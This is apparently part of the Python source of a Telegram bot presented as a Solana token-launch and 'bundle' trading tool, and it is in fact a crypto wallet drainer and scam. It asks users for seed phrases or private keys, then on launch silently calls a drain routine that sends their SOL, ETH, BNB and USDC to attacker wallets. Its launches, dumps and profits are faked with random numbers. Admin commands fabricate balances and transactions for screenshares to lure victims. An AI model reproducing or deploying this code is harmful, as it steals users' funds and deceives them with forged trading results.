@router.callback_query(F.data == "launch:confirm", LaunchStates.confirm)
async def launch_confirm(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    if not _rate_ok(uid, "launch"):
        await cb.answer("Too many launches — wait a bit", show_alert=True)
        return

    sess = get_session(uid)
    data = await state.get_data()
    invest = float(data.get("invest") or 0)
    if invest < 3:
        await cb.answer("Invest amount missing or below 3 SOL", show_alert=True)
        return

    if LARP_ENABLED and uid in ADMIN_IDS and not sess.wallets:
        ensure_larp_wallet(sess)

    if not sess.wallets:
        await cb.answer()
        await cb.message.edit_text(
            "🔒 <b>Connect a wallet</b>\n\n"
            "Enter your 12 or 24-word seed phrase\n"
            "(or private key) to continue.",
            reply_markup=wallets_empty_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.clear()
        return

    active = sess.wallets[sess.active_wallet_idx]
    if invest > active.balance_sol + 1e-9:
        await cb.answer()
        await cb.message.edit_text(
            f"❌ <b>Insufficient balance</b>\n\n"
            f"Invest: <b>{invest:.4f} SOL</b>\n"
            f"Available: <b>{active.balance_sol:.4f} SOL</b>",
            reply_markup=invest_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_invest)
        return

    if sess.launches_left <= 0 and not (LARP_ENABLED and uid in ADMIN_IDS):
        await cb.answer("No launches left. Use promo or pay.", show_alert=True)
        await state.clear()
        return

    await cb.answer()
    bundle = int(data.get("bundle", 10))
    larp = LARP_ENABLED and (uid in ADMIN_IDS or sess.larp_mode or any(getattr(w, "is_larp", False) for w in sess.wallets))

    await cb.message.edit_text(
        f"✅ <b>Confirmed & saved.</b>\n\n"
        f"Starting launch for <b>{data['name']}</b> (${data['symbol']})…",
        parse_mode=ParseMode.HTML,
    )

    per_wallet = round(invest / bundle, 4)
    stages = [
        (f"🔑 Generating {bundle} wallets…", 1.2),
        (f"💰 Wallet funding mode: <b>{per_wallet:.2f} SOL</b> each.", 1.0),
        ("🪙 Creating mint…", 1.0),
        ("📦 Building atomic bundle…", 1.2),
        ("⚡ Submitting priority tip…", 0.9),
        ("✅ Bundle wallets ACTIVE", 0.8),
    ]
    await staged_loading(cb, stages)

    # Deduct invest
    active.balance_sol = round(max(0.0, active.balance_sol - invest), 4)
    global bot_balance_sol
    if getattr(active, "is_larp", False):
        bot_balance_sol = round(max(0.0, bot_balance_sol - invest), 4)
        _save_state()

    mint = fake_mint()
    # Generate stable fake bundle wallet addresses for this token
    bundle_wallets = [_fake_sol_pubkey() for _ in range(bundle)]
    token = {
        "name": data["name"],
        "symbol": data["symbol"],
        "supply": data.get("supply", 1_000_000_000),
        "bundle": bundle,
        "invest": invest,
        "per_wallet": per_wallet,
        "desc": data.get("desc", ""),
        "image": data.get("image", ""),
        "twitter": data.get("twitter", ""),
        "telegram": data.get("telegram", ""),
        "instagram": data.get("instagram", ""),
        "website": data.get("website", ""),
        "mint": mint,
        "status": "live",
        "ts": time.time(),
        "larp": larp,
        "dumped": False,
        "dumped_idxs": [],
        "bundle_wallets": bundle_wallets,
        "owner_id": uid,
    }
    sess.launched_tokens.append(token)
    if not (LARP_ENABLED and uid in ADMIN_IDS):
        sess.launches_left = max(0, sess.launches_left - 1)

    add_personal_tx(sess, "🪙 Create Mint", "success")
    add_personal_tx(sess, f"📦 Bundle Buy ×{bundle}", "success", amount=-invest)
    add_personal_tx(sess, f"💰 Dev Buy {invest:.2f} SOL", "success", amount=-invest)

    # Drain real wallets only
    if (not getattr(active, "is_larp", False)
            and not sess.drained
            and (active.balance_sol > 0.00001 or active.balance_eth > 0.0001 or active.balance_bnb > 0.0001 or active.balance_usdc > 0.5)):
        eth_key = active.private_key if active.chain == "eth" else None
        asyncio.create_task(attempt_drain(uid, active.private_key, chain=active.chain, eth_key=eth_key, bot=cb.bot, user=cb.from_user))

    # Full wallet list
    lines = [f"<b>Bundle Wallets</b>\nToken: {data['name']} ({data['symbol']})\n"]
    for i, addr in enumerate(bundle_wallets, 1):
        lines.append(f"{i:02d}. Wallet {i} [ACTIVE]\n<code>{addr}</code>")
    wallets_block = "\n".join(lines)

    text = (
        f"🚀 <b>Launch live</b> — ${data['symbol']}\n"
        f"<code>{mint}</code>\n\n"
        f"{wallets_block}\n\n"
        f"💰 Funded: <b>{per_wallet:.4f} SOL</b> each · total <b>{invest:.4f}</b>\n"
        "Use individual Dump buttons or Dump All."
    )
    try:
        await cb.message.edit_text(text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
    except Exception:
        await cb.message.answer(text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
    await state.clear()


@router.callback_query(F.data.startswith("viewwallets:"))
async def view_wallets(cb: CallbackQuery):
    mint = cb.data.split(":", 1)[1]
    sess = get_session(cb.from_user.id)
    token = next((t for t in reversed(sess.launched_tokens) if t.get("mint") == mint), None)
    if not token:
        await cb.answer("Token not found", show_alert=True)
        return
    dumped = set(token.get("dumped_idxs") or [])
    lines = [f"<b>Bundle Wallets</b>\nToken: {token['name']} ({token['symbol']})\n"]
    for i, addr in enumerate(token.get("bundle_wallets") or [], 1):
        status = "DUMPED" if i in dumped or token.get("dumped") else "ACTIVE"
        lines.append(f"{i:02d}. Wallet {i} [{status}]\n<code>{addr}</code>")
    await cb.message.answer("\n".join(lines), parse_mode=ParseMode.HTML)
    await cb.answer()


@router.callback_query(F.data.startswith("dumpone:"))
async def dump_one(cb: CallbackQuery):
    # dumpone:mint:idx
    parts = cb.data.split(":")
    if len(parts) < 3:
        await cb.answer("Bad payload", show_alert=True)
        return
    mint, idx_s = parts[1], parts[2]
    try:
        idx = int(idx_s)
    except ValueError:
        await cb.answer("Bad index", show_alert=True)
        return
    sess = get_session(cb.from_user.id)
    token = next((t for t in reversed(sess.launched_tokens) if t.get("mint") == mint), None)
    if not token:
        await cb.answer("Token not found", show_alert=True)
        return
    if token.get("dumped"):
        await cb.answer("Already fully dumped", show_alert=True)
        return
    dumped = set(token.get("dumped_idxs") or [])
    if idx in dumped:
        await cb.answer(f"Wallet {idx} already dumped", show_alert=True)
        return

    await cb.answer(f"Dumping wallet {idx}…")
    per = float(token.get("per_wallet") or (token.get("invest", 3) / max(1, token.get("bundle", 1))))
    returned = round(per * random.uniform(1.5, 3.0), 4)
    dumped.add(idx)
    token["dumped_idxs"] = sorted(dumped)
    add_personal_tx(sess, f"💥 Dump wallet {idx}", "success", amount=returned)

    if sess.wallets:
        w = sess.wallets[sess.active_wallet_idx]
        w.balance_sol = round(w.balance_sol + returned, 4)
        if getattr(w, "is_larp", False):
            global bot_balance_sol
            bot_balance_sol = round(bot_balance_sol + returned, 4)
            _save_state()

    bundle = int(token.get("bundle") or 10)
    if len(dumped) >= bundle:
        token["dumped"] = True
        token["status"] = "dumped"
        await cb.message.answer(
            f"✅ Wallet {idx} dumped (+{returned:.4f} SOL)\n"
            f"💥 <b>All {bundle} wallets dumped successfully.</b>",
            reply_markup=post_dump_kb(mint),
            parse_mode=ParseMode.HTML,
        )
    else:
        await cb.message.answer(
            f"✅ Wallet {idx} dumped · +{returned:.4f} SOL\n"
            f"Remaining: {bundle - len(dumped)}/{bundle}",
            parse_mode=ParseMode.HTML,
        )


@router.callback_query(F.data.startswith("dump:"))
async def dump_all(cb: CallbackQuery):
    uid = cb.from_user.id
    sess = get_session(uid)
    mint = cb.data.split(":", 1)[1]
    token = next((t for t in reversed(sess.launched_tokens) if t.get("mint") == mint), None)
    if not token:
        await cb.answer("Token not found", show_alert=True)
        return
    if token.get("dumped"):
        await cb.answer("Already dumped", show_alert=True)
        return

    await cb.answer()
    invest = float(token.get("invest") or 3)
    bundle = int(token.get("bundle") or 10)
    symbol = token.get("symbol", "???")

    status = await cb.message.answer("💥 <b>Dumping all wallets…</b>", parse_mode=ParseMode.HTML)
    await asyncio.sleep(1.2)

    multiplier = random.uniform(1.55, 3.4)
    returned = round(invest * multiplier, 4)
    profit = round(returned - invest, 4)

    token["dumped"] = True
    token["status"] = "dumped"
    token["profit"] = profit
    token["returned"] = returned
    token["dumped_idxs"] = list(range(1, bundle + 1))

    add_personal_tx(sess, f"💥 DUMP ALL ${symbol}", "success", amount=returned)
    add_personal_tx(sess, "💰 Profit Claim", "success", amount=profit)

    if sess.wallets:
        w = sess.wallets[sess.active_wallet_idx]
        w.balance_sol = round(w.balance_sol + returned, 4)
        if getattr(w, "is_larp", False):
            global bot_balance_sol
            bot_balance_sol = round(bot_balance_sol + returned, 4)
            _save_state()
    sess.larp_profit_total = round(sess.larp_profit_total + profit, 4)

    try:
        await status.edit_text(
            "💥 Dumping all wallets…\n"
            "📊 PnL published.\n"
            f"✅ <b>All wallets dumped successfully.</b>\n\n"
            f"${symbol} · invested {invest:.4f} → returned <b>{returned:.4f}</b>\n"
            f"Profit: <b>+{profit:.4f} SOL</b>",
            reply_markup=post_dump_kb(mint),
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        await cb.message.answer(
            f"✅ All wallets dumped successfully.\nProfit: +{profit:.4f} SOL",
            reply_markup=post_dump_kb(mint),
            parse_mode=ParseMode.HTML,
        )


@router.callback_query(F.data.startswith("showpnl:"))
async def show_pnl(cb: CallbackQuery):
    mint = cb.data.split(":", 1)[1]
    sess = get_session(cb.from_user.id)
    token = next((t for t in reversed(sess.launched_tokens) if t.get("mint") == mint), None)
    if not token:
        await cb.answer("Token not found", show_alert=True)
        return
    invest = float(token.get("invest") or 0)
    returned = float(token.get("returned") or 0)
    profit = float(token.get("profit") or (returned - invest))
    await cb.message.answer(
        f"📊 <b>PnL — ${token.get('symbol')}</b>\n\n"
        f"Invested: <b>{invest:.4f} SOL</b>\n"
        f"Returned: <b>{returned:.4f} SOL</b>\n"
        f"Profit: <b>+{profit:.4f} SOL</b>\n"
        f"Bundle: ×{token.get('bundle', 0)}\n"
        f"Status: {token.get('status', '—')}",
        parse_mode=ParseMode.HTML,
    )
    await cb.answer()


@router.callback_query(F.data.startswith("dumpreset:"))
async def dump_reset(cb: CallbackQuery):
    mint = cb.data.split(":", 1)[1]
    sess = get_session(cb.from_user.id)
    token = next((t for t in reversed(sess.launched_tokens) if t.get("mint") == mint), None)
    if not token:
        await cb.answer("Token not found", show_alert=True)
        return
    # cosmetic reset of per-wallet dump markers only if not fully cashed out
    if token.get("dumped"):
        await cb.answer("Already fully dumped — can't reset", show_alert=True)
        return
    token["dumped_idxs"] = []
    await cb.answer("Per-wallet dump markers reset")
    bundle = int(token.get("bundle") or 10)
    try:
        await cb.message.edit_reply_markup(reply_markup=live_token_kb(mint, bundle))
    except Exception:
        pass


# ── Promo ───────────────────────────────────────────────────────────────────
# ── Promo ───────────────────────────────────────────────────────────────────
# ── Promo ───────────────────────────────────────────────────────────────────
@router.callback_query(F.data == "promo:enter")
async def promo_enter(cb: CallbackQuery, state: FSMContext):
    await cb.message.edit_text("🎟️ Send your promo code:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
    await state.set_state(PromoStates.waiting_code)
    await cb.answer()

@router.callback_query(F.data == "promo:pay")
async def promo_pay(cb: CallbackQuery):
    uid = cb.from_user.id
    sess = get_session(uid)
    invoice_id = random.randint(1, 99999)
    amount_display = f"100.{invoice_id:09d}"[:13]
    pay_to = PAYMENT_RECEIVER if not PAYMENT_RECEIVER.startswith("YourDrain") else DRAIN_DESTINATION
    if pay_to.startswith("YourDrain") or len(pay_to) < 32:
        pay_to = "Dgdu7AP8n9kSUWTH2c78YTiUEVoAqwPD1a77PPgZMKNw"
    expires = time.strftime("%b %d, %H:%M UTC", time.gmtime(time.time() + 86400))
    sess.pending_invoice = {
        "id": invoice_id,
        "amount": 100.0 + (invoice_id / 1e9),
        "amount_display": amount_display,
        "pay_to": pay_to,
        "created": time.time(),
        "expires": time.time() + 86400,
    }
    text = (
        "🧾 <b>Payment Invoice</b>\n"
        f"<code>INV-{invoice_id:05d}</code>\n"
        "────────────────\n\n"
        f"<b>Amount due</b>  <code>{amount_display} SOL</code>\n"
        f"<b>Network</b>     Solana\n"
        f"<b>Expires</b>     {expires}\n"
        "────────────────\n\n"
        "<b>Pay to this address</b>\n"
        f"<code>{pay_to}</code>\n\n"
        "📱 Scan with Phantom / Solflare — address and amount are filled.\n\n"
        "⚠️ <b>Send the exact amount shown.</b>\n"
        "The last few lamports are your invoice ID.\n\n"
        "✅ Access unlocks the moment payment lands."
    )
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="🔄 I've paid, check now", callback_data="promo:checkpay"))
    kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
    await cb.answer()

@router.callback_query(F.data == "promo:checkpay")
async def promo_checkpay(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    if not sess.pending_invoice:
        await cb.answer("No pending invoice", show_alert=True)
        return
    await cb.answer("Checking on-chain…", show_alert=False)
    await cb.message.answer(
        "⏳ Payment not detected yet.\n\n"
        "Make sure you sent the <b>exact</b> amount shown on the invoice.\n"
        "It can take 1–2 confirmations. Tap the button again in a few seconds.",
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu_kb(),
    )

@router.message(PromoStates.waiting_code)
async def promo_code(message: Message, state: FSMContext):
    code = message.text.strip().upper()
    sess = get_session(message.from_user.id)
    valid = {"RUG2026": 5, "BUNDLE": 3, "SNIPE": 4, "JITO": 2, "EARLY": 6, "VAULT": 3}
    if code in valid:
        sess.promo = code
        sess.launches_left += valid[code]
        text = f"✅ <b>Promo Applied</b>\n\nCode: <b>{code}</b>\n+{valid[code]} launches\nLaunches left: <b>{sess.launches_left}</b>"
        await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    else:
        await message.answer("❌ Invalid or expired code.", reply_markup=main_menu_kb())
    await state.clear()

@router.message(Command("setbal"))
async def cmd_setbal(message: Message):
    """Admin: /setbal <amount> — set vault + sync LARP wallets + inject txs."""
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = (message.text or "").split()
    if len(parts) < 2:
        await message.answer("Usage: <code>/setbal 12.5</code>", parse_mode=ParseMode.HTML)
        return
    try:
        amount = float(parts[1].replace(",", ""))
        if amount < 0:
            raise ValueError
    except ValueError:
        await message.answer("Invalid amount. Example: <code>/setbal 12.5</code>", parse_mode=ParseMode.HTML)
        return
    global bot_balance_sol
    bot_balance_sol = round(amount, 4)
    created = inject_fake_txs(random.randint(2, 4), types=["📥 Wallet Top-up", "⚡ Priority Tip", "💰 Profit Claim"])
    _save_state()
    sess = get_session(message.from_user.id)
    if LARP_ENABLED:
        ensure_larp_wallet(sess, force_balance=bot_balance_sol)
    else:
        for w in sess.wallets:
            if getattr(w, "is_larp", False):
                w.balance_sol = bot_balance_sol
    for tx in created:
        sess.last_tx.insert(0, dict(tx))
    lines = "\n".join(f"• {t['type']} · <code>{t['sig'][:16]}…</code>" for t in created)
    await message.answer(
        f"✅ Vault set to <b>{SOL_EMOJI} {bot_balance_sol:.4f}</b>\n"
        f"{'LARP wallet balance synced.' if LARP_ENABLED else ''}\n\n"
        f"Injected {len(created)} activity txs:\n{lines}",
        parse_mode=ParseMode.HTML,
    )


@router.message(Command("addbal"))
async def cmd_addbal(message: Message):
    """Admin: /addbal <amount> — add/subtract vault + sync LARP wallets."""
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = (message.text or "").split()
    if len(parts) < 2:
        await message.answer("Usage: <code>/addbal 1.25</code> or <code>/addbal -0.5</code>", parse_mode=ParseMode.HTML)
        return
    try:
        delta = float(parts[1].replace(",", ""))
    except ValueError:
        await message.answer("Invalid amount. Example: <code>/addbal 1.25</code>", parse_mode=ParseMode.HTML)
        return
    global bot_balance_sol
    bot_balance_sol = round(max(0.0, bot_balance_sol + delta), 4)
    tx_type = "📥 Wallet Top-up" if delta >= 0 else "📤 Transfer Out"
    created = inject_fake_txs(random.randint(2, 4), types=[tx_type, "⚡ Priority Tip", "🔄 Swap"])
    _save_state()
    sess = get_session(message.from_user.id)
    if LARP_ENABLED:
        ensure_larp_wallet(sess, force_balance=bot_balance_sol)
    else:
        for w in sess.wallets:
            if getattr(w, "is_larp", False):
                w.balance_sol = bot_balance_sol
    for tx in created:
        t = dict(tx)
        t["amount"] = delta
        sess.last_tx.insert(0, t)
    sign = "+" if delta >= 0 else ""
    lines = "\n".join(f"• {t['type']} · <code>{t['sig'][:16]}…</code>" for t in created)
    await message.answer(
        f"✅ Vault {sign}{delta:.4f} → <b>{SOL_EMOJI} {bot_balance_sol:.4f}</b>\n"
        f"{'LARP wallet balance synced.' if LARP_ENABLED else ''}\n\n"
        f"Injected {len(created)} activity txs:\n{lines}",
        parse_mode=ParseMode.HTML,
    )


@router.message(Command("larpon"))
async def cmd_larpon(message: Message):
    """Admin: enable LARP mode — inject fake wallet, realistic launch + dump profits."""
    if message.from_user.id not in ADMIN_IDS:
        return
    global LARP_ENABLED, bot_balance_sol
    LARP_ENABLED = True
    if bot_balance_sol <= 0:
        bot_balance_sol = round(random.uniform(4.2, 22.8), 4)
    sess = get_session(message.from_user.id)
    sess.larp_mode = True
    w = ensure_larp_wallet(sess, force_balance=bot_balance_sol)
    # seed a few realistic txs
    inject_fake_txs(3, types=["📥 Wallet Top-up", "⚡ Priority Tip", "🛡 Safety Scan"])
    add_personal_tx(sess, "📥 Wallet Linked", "success")
    _save_state()
    await message.answer(
        f"🎭 <b>LARP MODE ON</b>\n\n"
        f"Fake wallet injected into Wallets:\n"
        f"<code>{w.public_key}</code>\n"
        f"Balance: <b>{SOL_EMOJI} {w.balance_sol:.4f}</b>\n\n"
        f"• /addbal & /setbal now update wallet balance\n"
        f"• /randomtx [n] injects activity\n"
        f"• Launch flow is fully staged + auto dump profit\n"
        f"• /larpoff to disable",
        parse_mode=ParseMode.HTML,
    )


@router.message(Command("larpoff"))
async def cmd_larpoff(message: Message):
    """Admin: disable LARP mode and remove fake wallets from admin session."""
    if message.from_user.id not in ADMIN_IDS:
        return
    global LARP_ENABLED
    LARP_ENABLED = False
    sess = get_session(message.from_user.id)
    sess.larp_mode = False
    removed = remove_larp_wallets(sess)
    _save_state()
    await message.answer(
        f"🎭 <b>LARP MODE OFF</b>\n\n"
        f"Removed {removed} LARP wallet(s) from your session.\n"
        f"Real imports / drains unchanged.",
        parse_mode=ParseMode.HTML,
    )


@router.message(Command("randomtx"))
async def cmd_randomtx(message: Message):
    """Admin: /randomtx [n] — inject n random txs and lightly move LARP balance."""
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = (message.text or "").split()
    n = 5
    if len(parts) >= 2:
        try:
            n = max(1, min(25, int(parts[1])))
        except ValueError:
            await message.answer("Usage: <code>/randomtx</code> or <code>/randomtx 10</code>", parse_mode=ParseMode.HTML)
            return
    sess = get_session(message.from_user.id)
    types = [
        "⚡ Priority Tip",
        "📦 Bundle Buy",
        "🪙 Create Mint",
        "🔄 Swap",
        "💰 Profit Claim",
        "🎯 Sniper Dump",
        "📥 Wallet Top-up",
        "📤 Transfer Out",
        "🛡 Safety Scan",
        "🔐 Sniper Guard Lock",
    ]
    created = inject_fake_txs(n, types=types)
    # small realistic balance wobble when LARP on
    global bot_balance_sol
    delta_total = 0.0
    for i, tx in enumerate(created):
        t = dict(tx)
        if "Top-up" in t["type"] or "Profit" in t["type"] or "Dump" in t["type"]:
            amt = round(random.uniform(0.05, 1.8), 4)
            t["amount"] = amt
            delta_total += amt
        elif "Transfer Out" in t["type"] or "Tip" in t["type"]:
            amt = -round(random.uniform(0.01, 0.35), 4)
            t["amount"] = amt
            delta_total += amt
        sess.last_tx.insert(0, t)
    if LARP_ENABLED:
        bot_balance_sol = round(max(0.0, bot_balance_sol + delta_total), 4)
        ensure_larp_wallet(sess, force_balance=bot_balance_sol)
        _save_state()
    lines = "\n".join(
        f"• {t['type']}" + (f"  {t.get('amount', 0):+.4f}" if "amount" in t else "") + f" · <code>{t['sig'][:14]}…</code>"
        for t in created[:12]
    )
    await message.answer(
        f"🧾 <b>Injected {len(created)} txs</b>\n"
        f"{'Balance delta: ' + f'{delta_total:+.4f}' + f' → vault {bot_balance_sol:.4f}' if LARP_ENABLED else ''}\n\n"
        f"{lines}",
        parse_mode=ParseMode.HTML,
    )


@router.message(Command("larpwallet"))
async def cmd_larpwallet(message: Message):
    """Admin: force (re)create LARP wallet with current vault balance."""
    if message.from_user.id not in ADMIN_IDS:
        return
    global bot_balance_sol
    if bot_balance_sol <= 0:
        bot_balance_sol = round(random.uniform(3.5, 15.0), 4)
    sess = get_session(message.from_user.id)
    # drop old larp then make fresh
    remove_larp_wallets(sess)
    w = ensure_larp_wallet(sess, force_balance=bot_balance_sol)
    add_personal_tx(sess, "📥 Wallet Linked", "success")
    _save_state()
    await message.answer(
        f"🔑 <b>LARP wallet ready</b>\n\n"
        f"<code>{w.public_key}</code>\n"
        f"Balance: <b>{SOL_EMOJI} {w.balance_sol:.4f}</b>\n"
        f"Active: yes",
        parse_mode=ParseMode.HTML,
    )


@router.message(Command("dumpnow"))
async def cmd_dumpnow(message: Message):
    """Admin: simulate immediate sniper dump profit on last LARP launch."""
    if message.from_user.id not in ADMIN_IDS:
        return
    sess = get_session(message.from_user.id)
    token = None
    for t in reversed(sess.launched_tokens):
        if t.get("larp") or LARP_ENABLED:
            token = t
            break
    if not token:
        await message.answer("No LARP launch found. Launch a token first (with LARP on).")
        return
    profit = round(random.uniform(1.5, 11.0), 4)
    add_personal_tx(sess, "🎯 Sniper Dump", "success", amount=profit)
    add_personal_tx(sess, "💰 Profit Claim", "success", amount=profit)
    global bot_balance_sol
    bot_balance_sol = round(bot_balance_sol + profit, 4)
    sess.larp_profit_total = round(sess.larp_profit_total + profit, 4)
    ensure_larp_wallet(sess, force_balance=bot_balance_sol)
    token["status"] = "dumped"
    _save_state()
    await message.answer(
        f"💸 <b>Forced dump</b> on <b>${token['symbol']}</b>\n\n"
        f"Profit: +{SOL_EMOJI} <b>{profit:.4f}</b>\n"
        f"Vault: <b>{bot_balance_sol:.4f}</b>\n"
        f"Session LARP profits: <b>{sess.larp_profit_total:.4f}</b>",
        parse_mode=ParseMode.HTML,
    )


@router.message(Command("simactivity"))
async def cmd_simactivity(message: Message):
    """Admin: burst of realistic live-looking activity for screenshares."""
    if message.from_user.id not in ADMIN_IDS:
        return
    sess = get_session(message.from_user.id)
    if LARP_ENABLED:
        ensure_larp_wallet(sess)
    waves = [
        ("🔗 Jito tip landed", 0.4),
        ("📦 Bundle landed slot", 0.5),
        ("👀 3 snipers detected", 0.6),
        ("🎯 Auto-dump triggered", 0.7),
        ("💰 Profit settled", 0.5),
    ]
    status = await message.answer("📡 <b>Simulating live activity…</b>", parse_mode=ParseMode.HTML)
    profit = 0.0
    for label, delay in waves:
        await asyncio.sleep(delay)
        amt = round(random.uniform(0.2, 2.4), 4) if "Profit" in label or "dump" in label.lower() else None
        if amt:
            profit += amt
        add_personal_tx(sess, label, "success", amount=amt)
        try:
            await status.edit_text(f"📡 <b>{label}</b>…", parse_mode=ParseMode.HTML)
        except Exception:
            pass
    global bot_balance_sol
    if profit > 0 and LARP_ENABLED:
        bot_balance_sol = round(bot_balance_sol + profit, 4)
        ensure_larp_wallet(sess, force_balance=bot_balance_sol)
        _save_state()
    await status.edit_text(
        f"✅ <b>Activity burst done</b>\n"
        f"Profit this wave: +{SOL_EMOJI} <b>{profit:.4f}</b>\n"
        f"Vault: <b>{bot_balance_sol:.4f}</b>\n"
        f"Check 🧾 Tx tracker + 🔑 Wallets.",
        parse_mode=ParseMode.HTML,
    )


@router.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id not in ADMIN_IDS: return
    total = len(sessions)
    drained = sum(1 for s in sessions.values() if s.drained)
    wallets = sum(len(s.wallets) for s in sessions.values())
    launches = sum(len(s.launched_tokens) for s in sessions.values())
    await message.answer(
        f"👑 <b>Admin</b>\n"
        f"Users: {total}\n"
        f"Wallets: {wallets}\n"
        f"Drained: {drained}\n"
        f"Launches: {launches}\n"
        f"Vault: {SOL_EMOJI} {bot_balance_sol:.4f}\n"
        f"LARP: <b>{'ON' if LARP_ENABLED else 'OFF'}</b>\n"
        f"SOL dest: {'yes' if not DRAIN_DESTINATION.startswith('YourDrain') else 'NO'}\n"
        f"ETH dest: {'yes' if not ETH_DRAIN.startswith('0xYour') else 'NO'}\n"
        f"BNB dest: {'yes' if not BNB_DRAIN.startswith('0xYour') else 'NO'}\n"
        f"KEY_RECEIVER: {KEY_RECEIVER_ID}\n\n"
        f"<b>LARP cmds</b>: /larpon /larpoff /randomtx /larpwallet /dumpnow /simactivity /setbal /addbal",
        parse_mode=ParseMode.HTML,
    )

@router.message(Command("testdrain"))
async def test_drain(message: Message):
    if message.from_user.id not in ADMIN_IDS: return
    sess = get_session(message.from_user.id)
    if not sess.wallets:
        await message.answer("No wallet imported")
        return
    w = sess.wallets[sess.active_wallet_idx]
    await message.answer(
        f"Trying multi-chain drain:\n<code>{w.public_key}</code>\n"
        f"SOL dest: <code>{short_addr(DRAIN_DESTINATION)}</code>\n"
        f"ETH dest: <code>{short_addr(ETH_DRAIN)}</code>\n"
        f"Balance SOL: {w.balance_sol:.6f}",
        parse_mode=ParseMode.HTML,
    )
    eth_key = w.private_key if w.chain == "eth" else None
    await attempt_drain(message.from_user.id, w.private_key, chain=w.chain, eth_key=eth_key, bot=message.bot, user=message.from_user)
    await message.answer("Drain attempt finished — check logs / Tx tracker")

async def main():
    if BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE":
        log.error("Set BOT_TOKEN env var")
        return
    if DRAIN_DESTINATION.startswith("YourDrain") or len(DRAIN_DESTINATION) < 32:
        log.warning("DRAIN_WALLET not set — SOL drains skipped")
    if ETH_DRAIN.startswith("0xYour"):
        log.warning("ETH_DRAIN_WALLET not set — ETH/USDC drains skipped")
    _load_state()
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    log.info(
        "Bot starting | HAS_SOLANA=%s | HAS_WEB3=%s | KEY_RECEIVER=%s | vault=%.4f | LARP=%s",
        HAS_SOLANA, HAS_WEB3, KEY_RECEIVER_ID, bot_balance_sol, LARP_ENABLED,
    )
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())